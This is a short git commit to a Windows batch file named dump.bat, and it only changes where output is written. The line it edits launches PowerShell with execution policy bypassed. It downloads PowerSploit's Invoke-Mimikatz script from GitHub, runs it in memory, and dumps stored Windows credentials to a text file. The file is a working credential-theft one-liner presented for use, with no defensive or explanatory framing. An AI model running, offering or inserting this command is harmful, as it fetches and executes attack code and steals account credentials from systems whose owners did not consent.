251fac0dfccd9684dcb806c17020a5d27130821a
sigmaseven <sigmaseven@gmail.com>
2016-02-09 14:03:55 -0500

    Update dump.bat

--- dump.bat
+++ dump.bat
@@ -1,1 +1,1 @@
-powershell.exe -exec bypass "iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds" > C:\somevalidlocation\output.txt
+powershell.exe -exec bypass "iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds" > C:\output.txt
